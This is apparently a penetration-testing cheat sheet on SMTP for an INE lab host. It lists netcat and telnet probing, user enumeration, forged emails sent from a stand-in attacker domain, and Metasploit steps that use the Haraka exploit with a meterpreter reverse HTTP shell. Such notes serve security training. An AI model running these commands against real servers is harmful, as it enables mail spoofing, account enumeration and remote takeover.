# Table of Contents
1. Overview
	1. ports
2. Tools
	1. netcat
	2. telnet
	3. [smtp-user-enum](#smtp-user-enum)
	4. [sendmail](#sendmail)
	5. [msfconsole](#msfconsole)

---

# Overview
Simple Mail Transfer Protocol

## Ports
25

---

# Tools
## netcat
Can use netcat to log into server manually
```bash
nc demo.ine.local 25
```

```bash
VRFY admin@openmailbox.xyz
```

## telnet
telnet can be used to check supported commands/capabilities
```bash
telnet demo.ine.local 25
HELO attacker.xyz
EHLO attacker.xyz
```

Can use telnet login to draft an email
```bash
telnet demo.ine.local 25
HELO attacker.xyz
mail from: admin@attacker.xyz
rcpt to:root@openmailbox.xyz
data
Subject: Hi Root
Hello,
This is a fake mail sent using telnet command.
From,
Admin
.
```

## smtp-user-enum

```bash
smtp-user-enum -U /usr/share/commix/src/txt/usernames.txt -t demo.ine.local
```

## sendmail

```bash
sendemail -f admin@attacker.xyz -t root@openmailbox.xyz -s demo.ine.local -u Fakemail -m "Hi root, a fake from admin" -o tls=no
```

## msfconsole
### Example
1. `db_nmap -sV -O demo.ine.local` : scan and import
2. `search type:exploit name:haraka` : search for service found
3. `use exploit/linux/smtp/haraka`
	1. `options` : view options to set
	2. `set SRVPORT 9898` : local listen port, changed because payload
	3. `set email_to root@attackdefense.test` : to yourself?
	4. `set payload linux/x64/meterpreter_reverse_http`
	5. `set lhost 8080` : set payload lhost